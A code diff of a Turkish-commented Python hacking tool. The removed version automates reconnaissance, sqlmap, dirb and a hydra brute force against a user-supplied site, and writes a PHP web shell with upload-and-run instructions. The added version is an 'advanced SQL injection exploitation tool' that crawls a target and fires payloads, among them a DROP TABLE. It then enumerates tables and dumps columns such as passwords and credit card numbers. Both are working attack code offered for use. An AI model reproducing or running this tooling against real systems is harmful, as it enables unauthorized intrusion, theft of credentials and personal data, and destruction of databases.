@@ -1,167 +1,138 @@
-import subprocess
-import random
-import re
-import json
-import os
+import requests
+from urllib.parse import urlencode
+from bs4 import BeautifulSoup
 
-# Kullanıcıdan site ve portları al
-site = input("URL'yi girin (http:// veya https:// olmadan): ").strip()
+# Kullanılacak potansiyel tablo ve sütun isimleri
+TABLES = [
+    "users", "admin", "accounts", "customers", "orders",
+    "employees", "sessions", "transactions", "products", "inventory",
+    "logs", "messages", "settings", "config", "feedback",
+    "reviews", "payments", "tokens", "cart", "categories"
+]
 
-# URL doğrulama fonksiyonu
-def is_valid_url(url):
-    regex = re.compile(
-        r'^(https?:\/\/)?'  # http:// veya https://
-        r'(([A-Za-z0-9.-]+)\.([A-Za-z]{2,}))$'  # domain
-    )
-    return re.match(regex, url) is not None
+COLUMNS = [
+    "id", "username", "password", "email", "credit_card",
+    "name", "phone", "address", "dob", "gender",
+    "session_id", "ip_address", "login_time", "balance", "order_id",
+    "product_id", "category", "amount", "status", "comments"
+]
 
-if not is_valid_url(site):
-    print("Geçersiz URL girdiniz!")
-    exit()
-
-# Birden fazla port girişi için input al ve liste oluştur
-port_input = input("Açık Portları Girin (virgülle ayırarak): ").strip()
-ports = [port.strip() for port in port_input.split(",") if port.strip().isdigit()]
-
-# Rastgele port seç
-random_port = random.choice(ports) if ports else None
-
-# Çıktıları kaydetmek için JSON dosyası
-output_file = "sorgu_sonuclari.json"
-
-# Komut çalıştırma fonksiyonu
-def run_command(command, description):
-    print(f"\n### {description} ###\n")
-    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-    output = result.stdout + result.stderr
-    print(output)
-    save_results(description, output)
-
-# Sonuçları JSON dosyasına kaydetme fonksiyonu
-def save_results(description, result):
-    try:
-        with open(output_file, "r", encoding="utf-8") as file:
-            data = json.load(file)
-    except (FileNotFoundError, json.JSONDecodeError):
-        data = {}
-
-    data[description] = result
-    with open(output_file, "w", encoding="utf-8") as file:
-        json.dump(data, file, ensure_ascii=False, indent=4)
-
-# Shell dosyası oluşturma fonksiyonu
-def create_php_shell():
-    shell_content = """<?php
-    if(isset($_GET['cmd'])) {
-        echo "<pre>";
-        system($_GET['cmd']);
-        echo "</pre>";
-    } else {
-        echo "Shell çalışıyor!";
-    }
-    ?>"""
-    filename = "shell.php"
-    with open(filename, "w") as file:
-        file.write(shell_content)
-    print(f"PHP shell dosyası '{filename}' oluşturuldu.")
-    return filename
-
-# usernames.txt dosyasını oluşturma
-def create_usernames_file():
-    usernames = ["admin", "root", "user", "test", "guest", "administrator", "manager"]
-    filename = "usernames.txt"
-    with open(filename, "w") as file:
-        file.write("\n".join(usernames))
-    print(f"Kullanıcı adı dosyası '{filename}' oluşturuldu.")
-    return filename
-
-# Dosyayı baştan temizle
-with open(output_file, "w", encoding="utf-8") as file:
-    json.dump({}, file, ensure_ascii=False, indent=4)
-
-# 1. Bilgi Toplama
-run_command(f"nslookup {site}", "nslookup Sonucu")
-run_command(f"dig {site}", "dig Sonucu")
-run_command(f"dnsrecon -d {site}", "dnsrecon Sonucu")
-run_command(f"fierce -dns {site}", "fierce Sonucu")
-run_command(f"traceroute {site}", "traceroute Sonucu")
-
-# 2. Nmap ile Port Tarama ve Zafiyet Analizi
-#if ports:
-    #formatted_ports = ",".join(ports)
-    #run_command(f"nmap -Pn -p {formatted_ports} {site}", f"nmap Sonucu ({formatted_ports})")
-#run_command(f"nmap -Pn -sV --script=vuln {site}", "Nmap Zafiyet Taraması")
-
-# 3. SQL Injection Testi
-sql_test = input("\nSQL Injection testi yapmak istiyor musunuz? (E/h): ").strip().lower()
-if sql_test == "e":
-    run_command(f"sqlmap -u http://{site} --batch --risk=3 --level=5", "SQL Injection Test Sonucu")
-
-# 4. Admin Paneli Keşfi
-admin_panel_test = input("\nAdmin paneli taraması yapmak istiyor musunuz? (E/h): ").strip().lower()
-if admin_panel_test == "e":
-    run_command(f"dirb http://{site} /usr/share/wordlists/dirb/common.txt", "Admin Paneli Taraması Sonucu")
-
-# 5. Brute Force Testi
-brute_force_test = input("\nBrute force denemesi yapmak istiyor musunuz? (E/h): ").strip().lower()
-if brute_force_test == "e":
-    username_file = create_usernames_file()
-    password_file = "/usr/share/wordlists/rockyou.txt"  # Varsayılan olarak rockyou.txt kullanılır
-
-    run_command(f"hydra -L {username_file} -P {password_file} http-post-form \"/admin/login.php:user=^USER^&pass=^PASS^:F=incorrect\" -V",
-                "Brute Force Denemesi")
-
-# 6. Dosya Yükleme Açığı Testi
-upload_test = input("\nDosya yükleme açığını test etmek istiyor musunuz? (E/h): ").strip().lower()
-if upload_test == "e":
-    shell_file = create_php_shell()
-    print("Shell dosyanız hazırlandı. Yükleme açığı bulunan alana şu dosyayı yükleyin:")
-    print(f"\n{shell_file}")
-    print(f"\nDaha sonra şu URL ile komut çalıştırabilirsiniz: http://{site}/uploads/{shell_file}?cmd=ls")
-
-# SQL Injection Test Payloadları
-sql_payloads = [
-    "' OR '1'='1",
-    "' UNION SELECT null, version()--",
-    "' UNION SELECT username, password FROM users--",
-    "' AND SLEEP(5)--",
-    "' UNION SELECT @@version, NULL--",
-    "' OR 'a'='a",
-    "' AND 1=1--",
+# Yaygın payload listesi
+PAYLOADS = [
+    "' OR 1=1 -- -",
+    "' UNION SELECT NULL, NULL, NULL -- -",
+    "' AND 1=1 -- -",
+    "' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 65 -- -",
+    "' OR EXISTS(SELECT * FROM information_schema.tables) -- -",
+    "' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -",
+    "' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_schema=database() -- -",
+    "' OR 'x'='x' -- -",
     "' OR 1=1#",
-    "' OR 'a'='a' --",
-    "' OR 1=1 LIMIT 1 OFFSET 1--",
-    "' UNION SELECT NULL, table_name FROM information_schema.tables--",
-    "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
-    "' OR EXISTS(SELECT 1)--",
-    "' OR NOT EXISTS(SELECT 1)--",
-    "' OR LENGTH(user()) > 1--",
-    "' UNION SELECT database(), version()--"
+    "' OR 1=2 -- -",
+    "' OR sleep(5) -- -",
+    "'; DROP TABLE users; -- -",
+    "' AND 1=0 UNION SELECT database(), version(), user() -- -",
+    "' AND LENGTH(database()) > 3 -- -",
+    "' OR 1=1 UNION SELECT NULL,NULL,NULL -- -",
+    "' UNION SELECT @@version, user(), database() -- -",
+    "' AND 'abc' LIKE 'a%' -- -",
+    "' AND '1'='1' -- -",
+    "'; SELECT @@version -- -",
+    "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 -- -"
 ]
 
-# Admin Paneli Payloadları
-admin_panel_payloads = [
-    "/admin/",
-    "/administrator/",
-    "/login/",
-    "/admin.php",
-    "/admin/login.php",
-    "/admin/index.php",
-    "/cpanel/",
-    "/admin_area/",
-    "/backend/",
-    "/adminpanel/"
-]
-# 1. SQL Injection Testi
-print("\nSQL Injection testleri başlıyor...\n")
-for payload in sql_payloads:
-    print(f"\nDenenen Payload: {payload}")
-    run_command(f"sqlmap -u http://{site} --data=\"param={payload}\" --batch", f"SQL Injection Test Sonucu ({payload})")
-# Rastgele Port Bilgisi
-if random_port:
-    print(f"\n### Seçilen Rastgele Port: {random_port} ###\n")
-    save_results("Seçilen Rastgele Port", random_port)
+# Otomatik hedef URL çıkarma fonksiyonu
+def discover_urls(domain):
+    print("[*] URL'ler keşfediliyor...")
+    try:
+        response = requests.get(domain, timeout=10)
+        soup = BeautifulSoup(response.text, "html.parser")
+        links = [link.get('href') for link in soup.find_all('a', href=True)]
+        valid_urls = [url for url in links if url.startswith(domain) or url.startswith('/')]
+        print(f"[+] {len(valid_urls)} URL bulundu.")
+        return valid_urls
+    except Exception as e:
+        print(f"Hata: {e}")
+        return []
 
-# Bilgilendirme
-print(f"\nTüm sonuçlar '{output_file}' dosyasına kaydedildi.")
+# SQL Injection açık testi
+def test_sql_injection(url):
+    for payload in PAYLOADS:
+        test_url = f"{url}?id={payload}"
+        try:
+            response = requests.get(test_url, timeout=5)
+            if response.status_code == 200 and "error" not in response.text.lower():
+                print(f"[+] Açık bulunan URL: {test_url}")
+                return test_url
+        except Exception as e:
+            print(f"Hata: {e}")
+    return None
 
+# SQL Injection işlemleri
+def perform_sql_injection(url):
+    print(f"[+] SQL Injection hedef URL: {url}")
+    database_name = get_database_name(url)
+    if database_name:
+        print(f"[+] Veritabanı: {database_name}")
+        tables = get_tables(url)
+        for table in tables:
+            print(f"[+] Tablo bulundu: {table}")
+            columns = get_columns(url, table)
+            if columns:
+                print(f"[+] {table} tablosundaki sütunlar: {', '.join(columns)}")
+                extract_data(url, table, columns)
+
+def get_database_name(url):
+    payload = "' UNION SELECT database(), NULL, NULL -- -"
+    test_url = f"{url}?id={payload}"
+    response = requests.get(test_url, timeout=5)
+    if response.status_code == 200:
+        print("[+] Veritabanı adı tespit edildi.")
+        return extract_response(response.text)
+    return None
+
+def get_tables(url):
+    payload = "' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -"
+    test_url = f"{url}?id={payload}"
+    response = requests.get(test_url, timeout=5)
+    if response.status_code == 200:
+        print("[+] Tablolar tespit edildi.")
+        return extract_response(response.text).split(',')
+    return TABLES
+
+def get_columns(url, table_name):
+    payload = f"' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_name='{table_name}' -- -"
+    test_url = f"{url}?id={payload}"
+    response = requests.get(test_url, timeout=5)
+    if response.status_code == 200:
+        print(f"[+] {table_name} tablosundaki sütunlar tespit edildi.")
+        return extract_response(response.text).split(',')
+    return COLUMNS
+
+def extract_data(url, table_name, columns):
+    for column_group in [columns[i:i+3] for i in range(0, len(columns), 3)]:
+        col_select = ", ".join(column_group)
+        payload = f"' UNION SELECT {col_select} FROM {table_name} -- -"
+        test_url = f"{url}?id={payload}"
+        response = requests.get(test_url, timeout=5)
+        if response.status_code == 200:
+            print(f"[+] {table_name} tablosundan veri:\n{extract_response(response.text)}")
+
+# Yardımcı fonksiyon: HTML'den veri ayıklama
+def extract_response(response_text):
+    start = response_text.find("<body>") + 6
+    end = response_text.find("</body>")
+    return response_text[start:end].strip()
+
+# Ana işlem
+if __name__ == "__main__":
+    print("Gelişmiş SQL Injection Sömürme Aracı")
+    domain = input("Hedef Domain (ör. http://example.com): ")
+
+    urls = discover_urls(domain)
+    for url in urls:
+        full_url = domain + url if url.startswith('/') else url
+        vulnerable_url = test_sql_injection(full_url)
+        if vulnerable_url:
+            perform_sql_injection(vulnerable_url)
+            break
